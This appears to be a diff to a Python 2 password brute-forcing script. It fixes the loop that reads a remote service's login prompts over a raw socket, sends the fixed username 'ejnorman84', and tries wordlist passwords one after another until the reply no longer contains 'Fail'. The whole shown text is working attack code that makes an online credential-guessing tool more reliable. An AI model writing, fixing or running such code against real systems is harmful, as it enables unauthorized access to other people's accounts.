@@ -44,7 +44,7 @@ def brute_force():
     count=0
     result="Fail"
 
-    while count < len(lines1) and result == "Fail": 
+    while count < len(lines1) and "Fail" in result: 
    # Establish socket connection
     #add loop to go through checking if got correct password
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -93,7 +93,7 @@ def brute_force():
         response=s.recv(1024) #this one recieves the prompt for username and password at the same time ig this is the sleep that's causing that
         print response
         while ':' not in response:
-            s.recv(1024)
+            response+=s.recv(1024)
         s.send("ejnorman84\n")
         print "ejnorman84\n"
         #time.sleep(1)
@@ -102,7 +102,7 @@ def brute_force():
         print response
         print "`````````"
         while ':' not in response:
-            s.recv(1024)
+            response+=s.recv(1024)
         s.send(lines1[count].strip()+'\n')
         print lines1[count]
         time.sleep(2)
